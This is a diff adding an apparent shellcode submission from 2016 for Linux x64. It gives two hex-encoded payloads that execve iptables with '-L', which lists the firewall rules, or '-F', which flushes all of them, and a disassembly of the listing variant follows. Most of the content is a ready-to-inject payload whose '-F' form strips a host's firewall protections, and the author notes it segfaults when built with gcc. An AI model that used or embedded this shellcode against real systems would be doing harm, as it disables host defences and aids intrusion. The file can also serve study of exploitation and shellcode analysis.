@@ -1,0 +1,42 @@
+---------------------------------
+Flush Iptables with -F
+---------------------------------
+
+By Xophidia - 2016
+Platform: Linux / x64
+
+bug : work with nasm but segmentdefault with gcc
+
+Iptables -L
+
+"\x48\x31\xc0\x50\x48\xbb\x69\x70\x74\x61\x62\x6c\x65\x73\x53\x48\xbb\x2f"
+"\x73\x62\x69\x6e\x2f\x2f\x2f\x53\x48\x89\xe7\x50\x66\xbb\x2d\x4c\x66\x53"
+"\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+
+iptables -F
+
+"\x48\x31\xc0\x50\x48\xbb\x69\x70\x74\x61\x62\x6c\x65\x73\x53\x48\xbb\x2f"
+"\x73\x62\x69\x6e\x2f\x2f\x2f\x53\x48\x89\xe7\x50\x66\xbb\x2d\x46\x66\x53"
+"\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+
+
+
+  48 31 c0             	xor    rax,rax
+	50                   	push   rax
+	48 bb 69 70 74 61 62 	movabs rbx,0x73656c6261747069
+	6c 65 73 
+	53                   	push   rbx
+	48 bb 2f 73 62 69 6e 	movabs rbx,0x2f2f2f6e6962732f
+	2f 2f 2f 
+	53                   	push   rbx
+	48 89 e7             	mov    rdi,rsp
+	50                   	push   rax
+	66 bb 2d 4c          	mov    bx,0x4c2d
+	66 53                	push   bx
+	48 89 e6             	mov    rsi,rsp
+	50                   	push   rax
+	56                   	push   rsi
+	57                   	push   rdi
+	48 89 e6             	mov    rsi,rsp
+	b0 3b                	mov    al,0x3b
+	0f 05                	syscall 
